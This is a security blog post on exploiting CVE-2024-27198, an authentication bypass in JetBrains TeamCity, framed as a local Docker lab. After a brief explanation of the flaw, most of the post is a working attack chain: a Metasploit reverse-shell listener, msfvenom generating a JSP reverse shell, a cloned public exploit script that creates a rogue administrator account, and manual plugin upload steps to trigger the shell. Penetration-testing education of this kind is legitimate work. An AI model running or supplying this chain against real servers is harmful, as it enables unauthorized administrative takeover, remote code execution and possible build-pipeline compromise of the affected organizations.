---
title: 'TeamCity Authentication Bypass Vulnerability - CVE-2024-27198'
date: '2024-3-10'
category:
  - 'security'
tags:
  - 'cve'
  - 'teamcity'
  - 'exploit'
  - 'jetbrains'
summary: Learn how to exploit CVE-2024-27198, a critical authentication bypass vulnerability found in JetBrains TeamCity's web component.
coverImage: '/static/images/teamcity.jpg'
---
# Understanding CVE-2024-27198: A Critical Authentication Bypass Vulnerability

## Introduction

[CVE-2024-27198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27198) is a severe security flaw with a CVSSv3 score of 9.8, indicating its critical nature. This vulnerability is present in the web component of JetBrains TeamCity and is caused by an alternate path issue, which can be exploited to bypass authentication mechanisms.

## Detailed Exploit Analysis

The vulnerability stems from a weakness in the `BaseController` class within the `web-openapi.jar` library of TeamCity. When an API endpoint receives a request appended with `.jsp`, the `BaseController` class erroneously allows the request to bypass the standard authentication process. This flaw can be exploited by an attacker to gain unauthorized administrative access to the TeamCity server. [[Source](https://www.wiz.io/blog/jetbrains-teamcity-authentication-bypass-vulnerabilities-cve-2024-27198-cve-2024-27199)]

### The Alternate Path Issue

An alternate path issue occurs when software provides an unintended route to a goal that should be protected by authentication. In the case of CVE-2024-27198, the alternate path allows attackers to manipulate the URL to access authenticated endpoints directly, bypassing the login mechanism and gaining full control over the server.

### The Impact on TeamCity

Exploiting CVE-2024-27198 grants attackers complete control over all TeamCity projects, builds, agents, and artifacts. This level of access not only compromises the integrity of the server but also opens the door to more extensive supply chain attacks, where the attacker could insert malicious code into software builds.

## Setting Up and Executing the Exploit on Kali Linux

To demonstrate the exploit, one can set up a vulnerable TeamCity environment using Docker on Kali Linux:

```bash
# Pull a vulnerable TeamCity Server docker image (version: 2023.11.3)
docker pull jetbrains/teamcity-server:2023.11.3

# Run the docker container
docker run -it -d --name teamcity -u root -p 8111:8111 jetbrains/teamcity-server:2023.11.3
```
Navigate to http://localhost:8111 and complete the setup steps to finish server setup.

#### Prepare the listener
In a separate terminal window open a listener:
```bash
# Open a listener in metasploit 
msfconsole -q -x "use multi/handler; set payload java/jsp_shell_reverse_tcp; set lhost <yourip>; set lport 8088; exploit"
```
#### Execute! Execute! Execute!
After the server and listener are running, the exploit can be executed using the provided Python script:

```bash
# Clone the exploit repository
git clone https://github.com/W01fh4cker/CVE-2024-27198-RCE
cd CVE-2024-27198-RCE

# Create a jsp shell, I like to use https://www.revshells.com to do basic and quick executions like this. 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip> LPORT=8088 -f raw -o shell.jsp

# Execute the exploit scriptcd ..
python CVE-2024-27198-RCE.py -t http://localhost:8111 -u newadmn -p newpassword -f shell.jsp
```
This script will create a new administrative user, effectively bypassing the authentication and exploiting the vulnerability. In addition it will attempt to perform RCE. 

> NOTE: At time of writing, automated RCE is still being worked out. Stephen Fewer is working on a metapsloit module for this and you can get more details about his progress at https://github.com/rapid7/metasploit-framework/pull/18922. `W01fh4cker` has expressed concerns in this PR around issues uploading and activating plugins through this type of automation.


## If RCE Failure occurs
If RCE fails, as it does at time of writing, look in the directory you executed the above command from and you will see a `.jar` and a `.zip` file. Navigate to the teamcity server plugins panel at http://localhost:8111/admin/admin.html?item=plugins.

Click on `+ Upload plugin zip` and choose the zip file that was generated by the script. Make sure to activate the plugin. Copy the plugin name (as it will be random) and navigate to `http://localhost:8111/plugins/<plugin-name>/<plugin-name>.jsp`. 

Take a look at the terminal window that is running msfconsole listner and you should have connection to a dumbshell on the TeamCity server. üëç 

## Conclusion

CVE-2024-27198 is a critical vulnerability that requires immediate attention from administrators of TeamCity On-Premises installations. The alternate path issue at the heart of this vulnerability highlights the importance of thorough security practices in software development and the necessity of regular updates and patches.

